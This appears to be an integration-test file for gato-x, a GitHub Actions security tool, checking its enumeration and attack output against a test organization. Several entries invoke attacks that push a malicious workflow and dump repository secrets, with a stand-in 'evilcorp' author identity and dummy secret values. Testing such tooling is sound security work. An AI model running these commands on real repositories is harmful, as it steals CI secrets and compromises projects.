[
    {
        "PAT": "LOW_PRIV_PAT",
        "invocation": "gato-x enum --self-enumeration",
        "assertions": [
            {
                "expect": "[+] The user RampagingSloth belongs to 0 organizations!",
                "type": "stdout"
            },
            {
                "expect": "[+] The authenticated user is: RampagingSloth",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_MEMBER_REPO_TOKEN",
        "invocation": "gato-x enum --self-enumeration",
        "assertions": [
            {
                "expect": "[+] The user umbr4g3 belongs to 3 organizations!",
                "type": "stdout"
            },
            {
                "expect": "About to enumerate 5 repos within the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "The GitHub Classic PAT has the following scopes: repo",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_ADMIN_TOKEN",
        "invocation": "gato-x enum --self-enumeration",
        "assertions": [
            {
                "expect": "The user UncertainBadg3r belongs to 1 organizations!",
                "type": "stdout"
            },
            {
                "expect": "The user is an organization owner!",
                "type": "stdout"
            },
            {
                "expect": "The organization has",
                "type": "stdout"
            },
            {
                "expect": "org-level self-hosted runners!",
                "type": "stdout"
            },
            {
                "expect": "About to enumerate 5 repos within the gatoxtest organization!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "LOW_PRIV_PAT",
        "invocation": "gato-x enum --target gatoxtest",
        "assertions": [
            {
                "expect": "Enumerating the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "[!] The user has only public access!",
                "type": "stdout"
            },
            {
                "expect": "About to enumerate 3 repos within the gatoxtest organization!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_MEMBER_REPO_TOKEN",
        "invocation": "gato-x enum --target gatoxtest",
        "assertions": [
            {
                "expect": "Enumerating the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "About to enumerate 5 repos within the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "[+] The repository gatoxtest/TestWF contains a previous workflow run that executed on a self-hosted runner!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
        "invocation": "gato-x enum --target gatoxtest",
        "assertions": [
            {
                "expect": "Enumerating the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "The user is an organization owner!",
                "type": "stdout"
            },
            {
                "expect": "About to enumerate 5 repos within the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "[+] The repository gatoxtest/TestWF contains a previous workflow run that executed on a self-hosted runner!",
                "type": "stdout"
            },
            {
                "expect": "[+] The repository contains a workflow: main.yml that might execute on self-hosted runners!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_MEMBER_REPO_TOKEN",
        "invocation": "gato-x enum --repository gatoxtest/TestWF2",
        "assertions": [
            {
                "expect": "Enumerating: gatoxtest/TestWF2!",
                "type": "stdout"
            },
            {
                "expect": "The runner name was: ghrunner-test and the machine name was",
                "type": "stdout"
            },
            {
                "expect": "The user can only pull from the repository, but forking is allowed! Only a fork pull-request based attack would be possible.",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },

    {
        "PAT": "ORG_ADMIN_REPO_TOKEN",
        "invocation": "gato-x enum --repository gatoxtest/TestWF",
        "assertions": [
            {
                "expect": "Enumerating: gatoxtest/TestWF!",
                "type": "stdout"
            },
            {
                "expect": "The runner name was: ghrunner-test and the machine name was",
                "type": "stdout"
            },
            {
                "expect": "The user is an administrator on the repository!",
                "type": "stdout"
            },
            {
                "expect": "The PAT does not have the workflow scope, which means an existing workflow trigger must be used!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
        "invocation": "gato-x enum --repository gatoxtest/TestWF",
        "assertions": [
            {
                "expect": "Enumerating: gatoxtest/TestWF!",
                "type": "stdout"
            },
            {
                "expect": "The runner name was: ghrunner-test and the machine name was",
                "type": "stdout"
            },
            {
                "expect": "The user is an administrator on the repository!",
                "type": "stdout"
            },
            {
                "expect": "The PAT also has the workflow scope, which means a custom YAML payload can be used!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
        "invocation": "gato-x a -t gatoxtest/TestWF -w",
        "assertions": [
            {
                "expect": "Succesfully pushed the malicious workflow!",
                "type": "stdout"
            },
            {
                "expect": "Malicious branch deleted",
                "type": "stdout"
            },
            {
                "expect": "The malicious workflow executed succesfully!",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_ADMIN_TOKEN",
        "invocation": "gato-x e -t gatoxtest -sr",
        "assertions": [
            {
                "expect": "The organization has 1 secret(s)",
                "type": "stdout"
            },
            {
                "expect": "INTEGRATION_SECRET, last updated 2023-06-22T01:47:43Z",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
        "invocation": "gato-x e -r gatoxtest/TestEnvironment -sr",
        "assertions": [
            {
                "expect": "The repository can access 2 secrets and the token can use a workflow to read",
                "type": "stdout"
            },
            {
                "expect": "REPO_SECRET, last updated 2024-07-23T23:05:21Z",
                "type": "stdout"
            },
            {
                "expect": "INTEGRATION_SECRET, last updated 2024-07-23T23:05:38Z",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_MEMBER_REPO_TOKEN",
        "invocation": "gato-x enum --self-enumeration -oJ integration_test.json",
        "assertions": [
            {
                "expect": "[+] The user umbr4g3 belongs to 3 organizations!",
                "type": "stdout"
            },
            {
                "expect": "About to enumerate 5 repos within the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "The GitHub Classic PAT has the following scopes: repo",
                "type": "stdout"
            }
        ],
        "extra_validation": {
            "type": "file",
            "filename": "integration_test.json",
            "assertions": [
                "\"username\": \"umbr4g3\"",
                "\"accessible_runners\": [",
                "\"name\": \"ghrunner-test\","
            ]
        }
    },
    {
        "PAT": "ORG_MEMBER_REPO_TOKEN",
        "invocation": "gato-x enum --target gatoxtest -oJ integration_test.json",
        "assertions": [
            {
                "expect": "About to enumerate 5 repos within the gatoxtest organization!",
                "type": "stdout"
            },
            {
                "expect": "The GitHub Classic PAT has the following scopes: repo",
                "type": "stdout"
            }
        ],
        "extra_validation": {
            "type": "file",
            "filename": "integration_test.json",
            "assertions": [
                "\"username\": \"umbr4g3\"",
                "\"accessible_runners\": [",
                "\"name\": \"ghrunner-test\",",
                "\"org_member\": true,",
                "\"org_admin_user\": false,"
            ]
        }
    },
    {
        "PAT": "ORG_MEMBER_REPO_TOKEN",
        "invocation": "gato-x enum --repository gatoxtest/TestWF2 -oJ integration_test.json",
        "assertions": [
            {
                "expect": "The GitHub Classic PAT has the following scopes: repo",
                "type": "stdout"
            }
        ],
        "extra_validation": {
            "type": "file",
            "filename": "integration_test.json",
            "assertions": [
                "\"username\": \"umbr4g3\"",
                "\"accessible_runners\": [",
                "\"name\": \"ghrunner-test\",",
                "\"repositories\": [",
                "\"name\": \"gatoxtest/TestWF2\","
            ]
        }
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
        "invocation": "gato-x attack -t gatoxtest/TestWF --secrets --author-name Hackerman --author-email hacker@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 60",
        "assertions": [
            {
                "expect": "The malicious workflow executed succesfully!",
                "type": "stdout"
            },
            {
                "expect": "The repository has 1 accessible secret(s)!",
                "type": "stdout"
            },
            {
                "expect": "DUMMY_TEST_SECRET=SUPER SECRET DUMMY VALUE",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    },
    {
        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
        "invocation": "gato-x attack -t gatoxtest/TestWF --secrets --author-name Hackerman2 --author-email hacker2@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 60 -b exfil-branch",
        "assertions": [
            {
                "expect": "The malicious workflow executed succesfully!",
                "type": "stdout"
            },
            {
                "expect": "The repository has 1 accessible secret(s)!",
                "type": "stdout"
            },
            {
                "expect": "DUMMY_TEST_SECRET=SUPER SECRET DUMMY VALUE",
                "type": "stdout"
            }
        ],
        "extra_validation": {"type":"none"}
    }
]
